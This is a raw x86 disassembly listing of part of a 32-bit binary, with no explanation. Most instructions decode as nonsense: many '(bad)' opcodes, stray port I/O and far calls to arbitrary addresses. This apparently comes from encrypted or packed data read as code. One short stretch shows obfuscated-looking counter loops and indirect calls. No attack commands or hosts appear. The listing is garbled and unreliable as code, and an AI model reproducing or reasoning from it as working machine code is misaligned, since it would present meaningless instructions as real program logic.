  40a6dd:	cmp    edx,DWORD PTR [ecx+ecx*2+0x3611bd13]
  40a6e4:	lock mov ah,dl
  40a6e7:	pop    edi
  40a6e8:	add    eax,0xbb8bc24b
  40a6ed:	mov    ebp,DWORD PTR ss:0xf0c97f94
  40a6f4:	jbe    0x40a6e0
  40a6f6:	mov    cl,0x9f
  40a6f8:	pop    edi
  40a6f9:	inc    edi
  40a6fa:	sahf   
  40a6fb:	inc    edx
  40a6fc:	dec    ebx
  40a6fd:	sbb    BYTE PTR [ebp+0x241ea1d],bl
  40a703:	jo     0x40a6c1
  40a705:	aad    0x31
  40a707:	rcr    dl,cl
  40a709:	scas   al,BYTE PTR es:[edi]
  40a70a:	xor    al,0x5c
  40a70c:	push   edi
  40a70d:	inc    esp
  40a70e:	sub    BYTE PTR [ebx],0x22
  40a711:	push   esp
  40a712:	popf   
  40a713:	pop    es
  40a714:	int3   
  40a715:	jno    0x40a6f7
  40a717:	sub    ebx,edi
  40a719:	xor    bh,cl
  40a71b:	xchg   BYTE PTR [ebp-0x6fa2f000],ch
  40a721:	hlt    
  40a722:	sub    DWORD PTR [edi+ebx*4-0x50],0xffffffe1
  40a727:	fwait
  40a728:	sub    ebp,DWORD PTR [eax+0x183eb740]
  40a72e:	les    ebx,FWORD PTR [edi-0x3734f365]
  40a734:	mov    eax,0x539a4c20
  40a739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a73a:	out    0x3c,al
  40a73c:	pop    eax
  40a73d:	call   0x1f6dc90a
  40a742:	xor    al,0xfb
  40a744:	out    0x29,al
  40a746:	add    al,0xa
  40a748:	xchg   esp,eax
  40a749:	jb     0x40a75e
  40a74b:	jb     0x40a6f8
  40a74d:	pusha  
  40a74e:	mov    al,ds:0x74b8ce7e
  40a753:	xchg   edi,eax
  40a754:	call   0xce4e:0xbdb2c9c5
  40a75b:	loope  0x40a7c6
  40a75d:	ins    BYTE PTR es:[edi],dx
  40a75e:	aad    0x8e
  40a760:	into   
  40a761:	mov    dh,0x98
  40a763:	scas   eax,DWORD PTR es:[edi]
  40a764:	or     DWORD PTR [esi+0xc52f336],edx
  40a76a:	cmp    al,0x21
  40a76c:	lods   eax,DWORD PTR ds:[esi]
  40a76d:	mov    WORD PTR [edi],?
  40a76f:	imul   ebp,DWORD PTR [ebp-0x3f],0x8b3e2451
  40a776:	je     0x40a74f
  40a778:	popf   
  40a779:	hlt    
  40a77a:	pop    eax
  40a77b:	fwait
  40a77c:	dec    eax
  40a77d:	add    esp,DWORD PTR [esi-0x48]
  40a780:	std    
  40a781:	pop    esp
  40a782:	aas    
  40a783:	sub    ebp,ebp
  40a785:	lods   eax,DWORD PTR ds:[esi]
  40a786:	dec    ecx
  40a787:	sub    ecx,DWORD PTR [eax-0x4b]
  40a78a:	call   DWORD PTR [edx-0x13]
  40a78d:	in     al,0x48
  40a78f:	mov    WORD PTR [edx],ss
  40a791:	out    dx,al
  40a792:	or     BYTE PTR [ebx+esi*1],bl
  40a795:	jns    0x40a7b0
  40a797:	inc    ebp
  40a798:	mov    ebx,0xb5110a56
  40a79d:	dec    esp
  40a79f:	mov    ebx,0x73c4dd76
  40a7a4:	xchg   ebp,eax
  40a7a5:	push   ecx
  40a7a6:	xchg   edx,eax
  40a7a7:	mov    bl,0x5b
  40a7a9:	shl    BYTE PTR [esi-0x5e40d4a7],1
  40a7af:	pop    edx
  40a7b0:	loop   0x40a7e1
  40a7b2:	sbb    eax,DWORD PTR [edi]
  40a7b4:	mov    BYTE PTR [esi],ch
  40a7b6:	sub    al,0x1
  40a7b8:	add    DWORD PTR ds:0xe74d804,ebp
  40a7be:	fdiv   DWORD PTR [ebx-0x51]
  40a7c1:	retf   0x974a
  40a7c4:	sub    bh,BYTE PTR [esi]
  40a7c6:	ds push esi
  40a7c8:	and    BYTE PTR [ecx+0x74],dl
  40a7cb:	inc    edx
  40a7cc:	or     al,0xa8
  40a7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7cf:	xor    al,0x54
  40a7d1:	dec    ebx
  40a7d2:	dec    ebp
  40a7d3:	dec    esi
  40a7d4:	add    edx,DWORD PTR ds:0xa8bd96cc
  40a7da:	(bad)
  40a7de:	daa    
  40a7df:	hlt    
  40a7e0:	xor    eax,0xbb962ad6
  40a7e5:	inc    esi
  40a7e6:	(bad)  
  40a7e7:	outs   dx,DWORD PTR ds:[esi]
  40a7e8:	sub    edi,ebp
  40a7ea:	out    dx,eax
  40a7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ec:	mov    esi,0xbf6a93af
  40a7f1:	xlat   BYTE PTR ds:[ebx]
  40a7f2:	cmp    cl,ah
  40a7f4:	inc    esp
  40a7f5:	dec    ecx
  40a7f6:	retf   
  40a7f7:	sub    BYTE PTR [ebx-0x34],ch
  40a7fa:	aas    
  40a7fb:	sbb    BYTE PTR [ebp+0x36],0x16
  40a7ff:	xor    edi,edx
  40a801:	mov    bl,0x5e
  40a803:	ins    DWORD PTR es:[edi],dx
  40a804:	xchg   esi,eax
  40a805:	jns    0x40a868
  40a807:	dec    eax
  40a808:	pop    esi
  40a809:	addr16 mov esi,0x21749f40
  40a80f:	sbb    DWORD PTR [eax],esp
  40a811:	les    eax,FWORD PTR es:[edi]
  40a814:	fwait
  40a815:	loope  0x40a7d9
  40a817:	and    eax,0x381d4251
  40a81c:	adc    eax,0x4b22d5f0
  40a821:	in     eax,dx
  40a822:	mov    ds:0xddcae577,eax
  40a827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a828:	sub    DWORD PTR ds:[eax-0x631cce66],0x4c47cc15
  40a833:	jl     0x40a8a1
  40a835:	cmp    BYTE PTR [edx+0x36be3c7b],dh
  40a83b:	dec    esp
  40a83c:	pop    ss
  40a83d:	xchg   edx,eax
  40a83e:	rcl    BYTE PTR [edi],cl
  40a840:	ja     0x40a891
  40a842:	dec    eax
  40a843:	and    ecx,DWORD PTR [esi+edx*4-0x38]
  40a847:	inc    eax
  40a848:	mov    dl,0x52
  40a84a:	mov    esp,0x95b2a128
  40a84f:	add    DWORD PTR [edi],ebx
  40a851:	pop    ecx
  40a852:	add    BYTE PTR [ebx+0x2b],0x76
  40a856:	mov    ds:0x510b6365,eax
  40a85b:	xor    BYTE PTR [esi+0x6d],al
  40a85e:	sti    
  40a85f:	int    0xb0
  40a861:	in     al,0x52
  40a863:	xor    eax,DWORD PTR [edx+ebp*2+0x3f43d18c]
  40a86a:	adc    eax,0xba229353
  40a86f:	mov    ch,0x71
  40a871:	lds    edx,FWORD PTR [ebp+edx*4-0x7bffd6f4]
  40a878:	cli    
  40a879:	repnz jecxz 0x40a8c7
  40a87c:	push   eax
  40a87d:	xchg   DWORD PTR [edi+0x5a110d0d],esp
  40a883:	fwait
  40a884:	jno    0x40a831
  40a886:	loopne 0x40a8e3
  40a888:	outs   dx,DWORD PTR ds:[esi]
  40a889:	jb     0x40a8f5
  40a88b:	mov    al,0x9d
  40a88d:	jmp    0x40a8e1
  40a88f:	jp     0x40a8f7
  40a891:	loop   0x40a8e8
  40a893:	add    BYTE PTR [eax-0x20],dh
  40a896:	mov    WORD PTR [eax+esi*1+0x1515e85f],es
  40a89d:	sbb    ah,BYTE PTR [ebp-0x4b]
  40a8a0:	cmp    DWORD PTR [edi],0x65
  40a8a3:	push   ebx
  40a8a4:	ins    DWORD PTR es:[edi],dx
  40a8a5:	ds out 0xd,eax
  40a8a8:	loope  0x40a8ce
  40a8aa:	cwde   
  40a8ab:	icebp  
  40a8ac:	pop    ds
  40a8ad:	mov    cl,0x5
  40a8af:	mov    BYTE PTR [edx+0x2bce634a],dh
  40a8b5:	mov    bl,0x85
  40a8b7:	ror    DWORD PTR [ebp+0x7b4c20fc],0xf5
  40a8be:	mov    al,ds:0xb99fe833
  40a8c3:	fnstcw WORD PTR [esi]
  40a8c5:	sbb    eax,0xe83de3db
  40a8cb:	dec    ecx
  40a8cc:	cmp    dl,cl
  40a8ce:	std    
  40a8cf:	inc    edx
  40a8d0:	xor    BYTE PTR [ecx],dl
  40a8d2:	inc    edi
  40a8d3:	adc    edi,DWORD PTR [ebp+0x500c942a]
  40a8d9:	xor    edx,DWORD PTR [ecx+esi*8]
  40a8dc:	sub    edi,DWORD PTR [esi+eiz*1+0x41]
  40a8e0:	enter  0xcaaf,0xab
  40a8e4:	neg    esi
  40a8e6:	adc    ch,cl
  40a8e8:	xchg   BYTE PTR gs:0x66548d4,ch
  40a8ef:	or     BYTE PTR [esi+0x76],0x8e
  40a8f3:	fs retf 
  40a8f5:	mov    ebx,0xa6e1ad9a
  40a8fa:	scas   eax,DWORD PTR es:[edi]
  40a8fb:	jno    0x40a93e
  40a8fd:	(bad)  
  40a8fe:	in     al,dx
  40a8ff:	lock xor esi,DWORD PTR [ebp+0x2f8ae998]
  40a906:	push   ebp
  40a907:	aad    0xb9
  40a909:	ins    DWORD PTR es:[edi],dx
  40a90a:	inc    esp
  40a90b:	cmp    DWORD PTR [ecx+0x27ca4b67],ebx
  40a911:	pop    edx
  40a912:	xor    eax,0x19f1c1f8
  40a917:	mov    bh,0x29
  40a919:	out    dx,al
  40a91a:	pop    ebp
  40a91b:	push   edx
  40a91c:	mov    BYTE PTR [esi-0x24],dl
  40a91f:	daa    
  40a920:	retf   0x322
  40a923:	mov    dh,0x2c
  40a925:	push   eax
  40a926:	out    0x2,eax
  40a928:	mov    dh,0x98
  40a92a:	or     BYTE PTR ds:0x8a5264ad,0x47
  40a931:	inc    eax
  40a932:	sub    bl,BYTE PTR cs:[ecx+0x4dcd1e44]
  40a939:	mov    al,0xcf
  40a93b:	sub    eax,0xce3768fa
  40a940:	(bad)  
  40a941:	add    eax,edi
  40a943:	mov    dh,0xcf
  40a945:	adc    edi,DWORD PTR ds:0xb8a3ee98
  40a94b:	test   bh,bh
  40a94d:	pop    es
  40a94e:	push   esp
  40a94f:	xchg   DWORD PTR [edx+0x1160e283],ebp
  40a955:	mov    ebx,0x7f6700f5
  40a95a:	adc    esp,DWORD PTR [si-0x74]
  40a95e:	mov    bh,0x2a
  40a960:	fidivr WORD PTR [edi-0x38]
  40a963:	fdivr  DWORD PTR [edx]
  40a965:	mov    esp,0x83c2aae7
  40a96a:	icebp  
  40a96b:	mov    eax,DWORD PTR [ebx+0x46]
  40a96e:	adc    eax,DWORD PTR ds:0xd5aa8ccc
  40a974:	lods   eax,DWORD PTR ds:[esi]
  40a975:	test   DWORD PTR [ecx+ebp*1],ebx
  40a978:	or     eax,0x78ec97e3
  40a97d:	into   
  40a97e:	and    edx,DWORD PTR [ecx+0x326e48f3]
  40a984:	gs popf 
  40a986:	fimul  DWORD PTR [esi]
  40a989:	jle    0x40a9cf
  40a98b:	jg     0x40a9ff
  40a98d:	hlt    
  40a98e:	loopne 0x40a9ce
  40a990:	outs   dx,BYTE PTR ds:[esi]
  40a991:	push   esi
  40a992:	or     DWORD PTR ds:0x428e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42a9ef
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9bb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429beb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9bf
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	inc    esp
  40aafc:	icebp  
  40aafd:	adc    eax,DWORD PTR [ebp-0x19]
  40ab00:	test   BYTE PTR [ebx-0x7c9f0e7d],0x83
  40ab07:	jmp    0xe1587153
  40ab0c:	les    edi,FWORD PTR [edx]
  40ab0e:	into   
  40ab0f:	dec    esp
  40ab10:	push   edx
  40ab11:	call   0x56922af1
  40ab16:	pop    ds
  40ab17:	push   edx
  40ab18:	stc    
  40ab19:	mov    esp,0xa547a54c
  40ab1e:	push   esp
  40ab1f:	sub    dh,BYTE PTR [esi-0x11600767]
  40ab25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab26:	mov    ds:0xa5c3687a,al
  40ab2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab2c:	jp     0x40ab71
  40ab2e:	jge    0x40aafe
  40ab30:	ja     0x40aaf8
  40ab32:	mov    ds:0xd50dd7bc,eax
  40ab37:	mov    al,0x8b
  40ab39:	add    DWORD PTR [edi],ecx
  40ab3b:	cmp    DWORD PTR [edi],ebx
  40ab3d:	repz push edi
  40ab3f:	test   al,0xa
  40ab41:	ss cld 
  40ab43:	xor    BYTE PTR [ecx-0x73],ch
  40ab46:	lea    ebp,[edx+edi*1-0x1e9e4fd]
  40ab4d:	icebp  
  40ab4e:	mov    eax,ds:0x97f56e34
  40ab53:	push   edx
  40ab54:	dec    eax
  40ab55:	xchg   edx,eax
  40ab56:	repz xchg ebp,eax
  40ab58:	pushf  
  40ab59:	sub    al,0x44
  40ab5b:	xor    ah,BYTE PTR fs:[ebx]
  40ab5e:	cdq    
  40ab5f:	mov    WORD PTR [esi+0x4299a78b],ss
  40ab65:	std    
  40ab66:	jg     0x40aae9
  40ab68:	mov    ebp,0x6a1ac10c
  40ab6d:	adc    eax,0xb3d86a78
  40ab72:	xchg   edi,eax
  40ab73:	outs   dx,DWORD PTR ds:[esi]
  40ab74:	push   edi
  40ab75:	mov    edi,0xa9883310
  40ab7a:	dec    edi
  40ab7b:	das    
  40ab7c:	into   
  40ab7d:	pop    ebx
  40ab7e:	stos   BYTE PTR es:[edi],al
  40ab7f:	out    0xad,al
  40ab81:	push   ebp
  40ab82:	dec    ebp
  40ab83:	shr    BYTE PTR [ebx-0x77b3fd4],0xfe
  40ab8a:	jp     0x40abb0
  40ab8c:	inc    ebx
  40ab8d:	bound  esp,QWORD PTR [edx]
  40ab8f:	push   edx
  40ab90:	ret    0x598d
  40ab93:	xchg   ebx,eax
  40ab94:	daa    
  40ab95:	pop    es
  40ab96:	outs   dx,DWORD PTR ds:[esi]
  40ab97:	jmp    0xf55b:0x388edcb
  40ab9e:	sbb    DWORD PTR [edi-0x980e555],ecx
  40aba4:	sbb    eax,0x4c1f296b
  40aba9:	pop    ss
  40abaa:	adc    DWORD PTR [esp+eax*4-0x60c25afe],0x62b72313
  40abb5:	or     al,BYTE PTR [ecx+0x62]
  40abb8:	push   edi
  40abb9:	pop    eax
  40abba:	(bad)  
  40abbc:	ds test eax,0xa93438e8
  40abc2:	xor    BYTE PTR [ebp-0x3325fa21],bl
  40abc8:	jp     0x40abdb
  40abca:	inc    ebx
  40abcb:	aad    0x2
  40abcd:	fisttp WORD PTR [eax]
  40abcf:	pusha  
  40abd0:	push   ebx
  40abd1:	mov    eax,ds:0xc84855ba
  40abd6:	or     al,0xab
  40abd8:	cmp    al,0x65
  40abda:	(bad)  
  40abdc:	and    eax,0x3c817227
  40abe1:	fldcw  WORD PTR [ebp+0x49]
  40abe4:	xor    BYTE PTR [edx-0x55c9de78],0xb1
  40abeb:	or     esp,DWORD PTR [ecx]
  40abed:	in     eax,0x44
  40abef:	add    DWORD PTR [ebx-0x24],eax
  40abf2:	test   BYTE PTR [ecx],dl
  40abf4:	dec    esp
  40abf5:	es in  al,0x8c
  40abf8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40abfa:	or     BYTE PTR [ecx-0x5907c6c2],dl
  40ac00:	out    0xe7,eax
  40ac02:	xchg   esi,eax
  40ac03:	dec    BYTE PTR [edx-0x4e]
  40ac06:	mov    ds:0x165ce1cb,eax
  40ac0b:	pop    edi
  40ac0c:	or     eax,0x705d0601
  40ac11:	ins    BYTE PTR es:[edi],dx
  40ac12:	add    dh,BYTE PTR [ebx]
  40ac14:	jbe    0x40ac53
  40ac16:	retf   
  40ac17:	(bad)  
  40ac18:	inc    esi
  40ac1a:	push   ecx
  40ac1b:	sbb    eax,0xc7ffdf01
  40ac20:	sub    al,0x49
  40ac22:	mov    ch,0xcc
  40ac24:	mov    edx,0xdf149d40
  40ac29:	repnz mov eax,ds:0x1b2249f2
  40ac2f:	inc    edi
  40ac30:	loop   0x40ac20
  40ac32:	mov    ecx,0x46e7157f
  40ac37:	cmp    edi,DWORD PTR [edx+0x76]
  40ac3a:	pop    eax
  40ac3b:	lods   al,BYTE PTR ds:[esi]
  40ac3c:	xchg   esp,eax
  40ac3d:	out    0x3e,eax
  40ac3f:	jne    0x40abf4
  40ac41:	and    eax,0x34900ed2
  40ac46:	das    
  40ac47:	div    DWORD PTR [eax-0x22]
  40ac4a:	inc    eax
  40ac4b:	call   0x139fac16
  40ac50:	adc    al,0x91
  40ac52:	fsubr  DWORD PTR [esi]
  40ac54:	jge    0x40ac6b
  40ac56:	inc    ebp
  40ac57:	ret    
  40ac58:	sti    
  40ac59:	sbb    DWORD PTR [eax],0xfffffff9
  40ac5c:	xor    DWORD PTR [edi],0xffffff98
  40ac5f:	sbb    ah,bh
  40ac61:	bound  eax,QWORD PTR [edi]
  40ac63:	inc    ebx
  40ac64:	add    ecx,DWORD PTR [edi]
  40ac66:	or     eax,0x6ce01898
  40ac6b:	mov    bh,0x2a
  40ac6d:	dec    ebx
  40ac6e:	popf   
  40ac6f:	push   es
  40ac70:	iret   
  40ac71:	aas    
  40ac72:	loope  0x40ac4d
  40ac74:	div    BYTE PTR [esi+0x2fa8a67b]
  40ac7a:	out    dx,al
  40ac7b:	sub    DWORD PTR [edx-0x231f3c7e],edx
  40ac81:	push   ebp
  40ac82:	xchg   ebx,eax
  40ac83:	jbe    0x40acac
  40ac85:	push   ds
  40ac86:	icebp  
  40ac87:	test   eax,0x847e5a3b
  40ac8c:	sbb    dh,BYTE PTR [esi+0x43dc70e9]
  40ac92:	call   0xa45a:0x452023b9
  40ac99:	mov    DWORD PTR [ecx+eax*8+0x6d],esp
  40ac9d:	add    eax,0x50297f7e
  40aca2:	psubq  mm0,QWORD PTR [edi+0x59]
  40aca6:	jl     0x40acea
  40aca8:	add    eax,DWORD PTR [eax]
  40acaa:	adc    edi,DWORD PTR [ebx-0x30]
  40acad:	lods   eax,DWORD PTR ds:[esi]
  40acae:	lock xchg edi,eax
  40acb0:	in     al,dx
  40acb1:	add    eax,0x450962ef
  40acb6:	mov    eax,0x94d8e217
  40acbb:	scas   eax,DWORD PTR es:[edi]
  40acbc:	sbb    ch,BYTE PTR [eax-0x5018f556]
  40acc2:	scas   al,BYTE PTR es:[edi]
  40acc3:	mov    ecx,0x7f38cbd2
  40acc8:	inc    edx
  40acc9:	adc    BYTE PTR [ecx+ebx*2-0x7d],bh
  40accd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acce:	rcl    BYTE PTR [edi-0x47],cl
  40acd1:	xor    al,0x5
  40acd3:	outs   dx,DWORD PTR ds:[esi]
  40acd4:	cmp    al,0xa
  40acd6:	push   ds
  40acd7:	sub    DWORD PTR [edx+0x263f2559],esp
  40acdd:	daa    
  40acde:	sub    al,0x5a
  40ace0:	pop    ds
  40ace1:	jb     0x40ad14
  40ace3:	pop    ds
  40ace4:	bound  ebp,QWORD PTR [ecx]
  40ace6:	dec    edx
  40ace7:	push   es
  40ace8:	dec    esp
  40ace9:	cmp    eax,0xd8266d46
  40acee:	popa   
  40acef:	test   al,0xbc
  40acf1:	sbb    BYTE PTR [edi-0xe21f4cc],dl
  40acf7:	stc    
  40acf8:	mov    al,ds:0x3d5c9a89
  40acfd:	in     eax,0xbf
  40acff:	mov    bl,0x59
  40ad01:	sbb    DWORD PTR [eax],edx
  40ad03:	sbb    BYTE PTR [esi],ah
  40ad05:	mov    dh,0x62
  40ad07:	jb     0x40ad42
  40ad09:	mov    ah,0x22
  40ad0b:	sub    edx,DWORD PTR [edx]
  40ad0d:	loope  0x40acd0
  40ad0f:	mov    WORD PTR [edx+0x13ad542],ds
  40ad15:	xor    BYTE PTR [edx-0x4c],al
  40ad18:	or     ch,bh
  40ad1a:	mov    bl,0xec
  40ad1c:	or     ebx,esi
  40ad1e:	fbstp  TBYTE PTR [edi]
  40ad20:	stos   DWORD PTR es:[edi],eax
  40ad21:	pause  
  40ad23:	in     al,dx
  40ad24:	xchg   esi,eax
  40ad25:	sti    
  40ad26:	mov    ecx,0x8ba53d5b
  40ad2b:	or     dl,dl
  40ad2d:	in     al,0x56
  40ad2f:	add    al,0x22
  40ad32:	dec    esp
  40ad33:	scas   eax,DWORD PTR es:[edi]
  40ad34:	or     eax,0xd5ac08c
  40ad39:	mov    bl,0x57
  40ad3b:	mov    ecx,0xd6f89699
  40ad40:	xchg   esp,esp
  40ad42:	mov    eax,ds:0xf9704f0f
  40ad47:	add    DWORD PTR [eax+edi*1],esp
  40ad4a:	aad    0x68
  40ad4c:	xchg   ecx,eax
  40ad4d:	arpl   dx,ax
  40ad4f:	mov    ah,0xb3
  40ad51:	jne    0x40ad1f
  40ad53:	lds    ebx,FWORD PTR [esp+ebx*4-0x43e26dd9]
  40ad5a:	xchg   ecx,eax
  40ad5b:	and    edx,0x76
  40ad5e:	mov    WORD PTR [esi-0x70f3ae86],ss
  40ad64:	jmp    0x158d79b8
  40ad69:	(bad)  
  40ad6a:	gs loop 0x40ad00
  40ad6d:	clc    
  40ad6e:	retf   0xd26
  40ad71:	loop   0x40add9
  40ad73:	push   ds
  40ad74:	imul   DWORD PTR [edi-0x7f]
  40ad77:	call   0xaee42784
  40ad7c:	sbb    al,0x72
  40ad7e:	mov    al,ds:0x666f1d42
  40ad83:	sub    ebp,ebp
  40ad85:	dec    ecx
  40ad86:	or     eax,0xd8f2e8a2
  40ad8b:	loop   0x40ad37
  40ad8d:	sbb    WORD PTR [esi],ax
  40ad90:	and    bh,cl
  40ad92:	cwde   
  40ad93:	push   ecx
  40ad94:	fisttp DWORD PTR [ebp+0x1b]
  40ad97:	out    dx,eax
  40ad98:	xchg   ebx,eax
  40ad99:	clc    
  40ad9a:	stc    
  40ad9b:	pushf  
  40ad9c:	and    BYTE PTR [ebx],al
  40ad9e:	enter  0x6743,0x93
  40ada2:	cli    
  40ada3:	hlt    
  40ada4:	xor    BYTE PTR [ebx-0x1cdf3077],ah
  40adaa:	xchg   edi,eax
  40adab:	fist   DWORD PTR [ecx]
  40adad:	in     al,dx
  40adae:	inc    esp
  40adaf:	dec    ecx
  40adb0:	add    al,0x8f
  40adb2:	mov    ebp,ebp
  40adb4:	aas    
  40adb5:	gs (bad) 
  40adb7:	(bad)  
  40adb8:	xor    DWORD PTR [eax],edi
  40adba:	cld    
  40adbb:	push   ecx
  40adbc:	fisttp WORD PTR [edx-0x50754fce]
  40adc2:	push   edi
  40adc3:	outs   dx,DWORD PTR ds:[esi]
  40adc4:	mov    ch,0x2f
  40adc6:	xor    cl,BYTE PTR [edx+edx*4+0x78]
  40adca:	mov    esp,0x5bb81b7b
  40adcf:	sub    ah,al
  40add1:	xchg   esp,eax
  40add2:	push   ss
  40add3:	push   0x35
  40add5:	mov    ebp,0xfd683c7b
  40adda:	jae    0x40add4
  40addc:	xor    bl,BYTE PTR [ecx]
  40adde:	fldcw  WORD PTR ds:0x6c2c73d5
  40ade4:	mov    ds:0xc51fe9a9,eax
  40ade9:	out    dx,al
  40adea:	loope  0x40ad88
  40adec:	and    DWORD PTR [ecx+0x22],ebp
  40adef:	inc    esi
  40adf0:	(bad)  
  40adf1:	ja     0x40ae6e
  40adf3:	cmp    al,0xbe
  40adf5:	jg     0x40ad87
  40adf7:	addr16 or eax,0x7bb5e0a0
  40adfd:	std    
  40adfe:	outs   dx,DWORD PTR ds:[esi]
  40adff:	and    ecx,esp
  40ae01:	xchg   ebx,eax
  40ae02:	mov    bl,0xbe
  40ae04:	ret    
  40ae05:	lock in al,0xeb
  40ae08:	jnp    0x40ae37
  40ae0a:	lods   eax,DWORD PTR ds:[esi]
  40ae0b:	sub    BYTE PTR [edi],dh
  40ae0d:	outs   dx,DWORD PTR ds:[esi]
  40ae0e:	push   edx
  40ae0f:	mov    ebp,0x9df11a05
  40ae14:	les    ebx,FWORD PTR [eax+edx*4]
  40ae17:	jmp    0x40ae77
  40ae19:	xor    DWORD PTR [edx],ebp
  40ae1b:	or     esp,DWORD PTR [ecx+0x7c69cf44]
  40ae21:	imul   DWORD PTR [ebx+0x4d1ffe8b]
  40ae27:	pop    es
  40ae28:	and    al,0xf4
  40ae2a:	xor    DWORD PTR [ecx],eax
  40ae2c:	sub    al,0x68
  40ae2e:	(bad)  
  40ae2f:	fcmovnb st,st(2)
  40ae31:	cmp    eax,ebx
  40ae33:	adc    edi,DWORD PTR [edi+ebx*4-0x1fa7599c]
  40ae3a:	in     al,dx
  40ae3b:	(bad)  
  40ae3c:	les    esp,FWORD PTR [ebp+edi*4-0x1e]
  40ae40:	or     al,BYTE PTR [eax+0x4d35b0a1]
  40ae46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae47:	adc    ecx,DWORD PTR [ebx+eax*1-0x3bc5e765]
  40ae4e:	fst    DWORD PTR [ebx]
  40ae50:	pop    esp
  40ae51:	stos   BYTE PTR es:[edi],al
  40ae52:	mov    ecx,0xc58f7b5e
  40ae57:	div    BYTE PTR [ecx-0x19ed44fb]
  40ae5d:	jbe    0x40ae3b
  40ae5f:	in     eax,0xdd
  40ae61:	mov    dh,BYTE PTR ds:0x44b6206d
  40ae67:	pop    ds
  40ae68:	int    0x45
  40ae6a:	call   0xb0e45374
  40ae6f:	and    al,0x2b
  40ae71:	or     BYTE PTR [ecx+0x4f787ae4],0xcb
  40ae78:	adc    DWORD PTR [ecx+0x60],ebp
  40ae7b:	ins    BYTE PTR es:[edi],dx
  40ae7c:	push   0x55
  40ae7e:	mov    al,0x29
  40ae80:	sbb    ah,dl
  40ae82:	retf   
  40ae83:	push   ebx
  40ae84:	mov    BYTE PTR [ebp-0x52],0x39
  40ae88:	int3   
  40ae89:	cwde   
  40ae8a:	imul   ecx,DWORD PTR [esi+eiz*2+0x328e8918],0xffffffcb
  40ae92:	repnz sbb al,0x9d
  40ae95:	xor    edi,DWORD PTR [esi-0x13]
  40ae98:	popf   
  40ae99:	shr    DWORD PTR [edx],0x55
  40ae9c:	rcr    esi,cl
  40ae9e:	pop    ds
  40ae9f:	xchg   ebp,eax
  40aea0:	setg   BYTE PTR [ecx]
  40aea3:	ret    0x5acb
  40aea6:	rol    BYTE PTR ss:[esi+0x39cab8cd],0xc2
  40aeae:	das    
  40aeaf:	stc    
  40aeb0:	into   
  40aeb1:	xor    BYTE PTR [eiz*2+0x6b067ac],0x91
  40aeb9:	mov    edi,0x4489c4d9
  40aebe:	(bad)  [esi-0x76]
  40aec1:	or     DWORD PTR [edx],edx
  40aec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec4:	in     eax,0x65
